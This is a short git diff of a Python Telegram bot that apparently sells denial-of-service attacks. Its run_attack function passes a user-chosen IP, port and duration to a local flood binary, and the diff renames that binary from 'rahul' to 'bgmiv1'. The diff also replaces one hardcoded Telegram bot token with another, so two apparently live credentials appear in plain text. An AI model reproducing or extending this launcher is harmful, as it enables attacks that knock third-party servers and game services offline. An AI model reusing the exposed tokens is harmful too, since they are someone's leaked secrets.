@@ -20,7 +20,7 @@ settings_collection = db['settings0']  # A new collection to store global settin
 redeem_codes_collection = db['redeem_codes0']
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '7597501553:AAF3SFe_GZrgcf25BRAHRZRFz6UPsvoofN0'
+TELEGRAM_BOT_TOKEN = '7763085379:AAFRKEZi2xBB7OqIjqTj9QcKLY-ol7sZd9M'
 ADMIN_USER_ID = 6005957043  # Replace with your admin user ID
 
 async def help_command(update: Update, context: CallbackContext):
@@ -158,7 +158,7 @@ async def attack(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./rahul {ip} {port} {duration} ",
+            f"./bgmiv1 {ip} {port} {duration} ",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
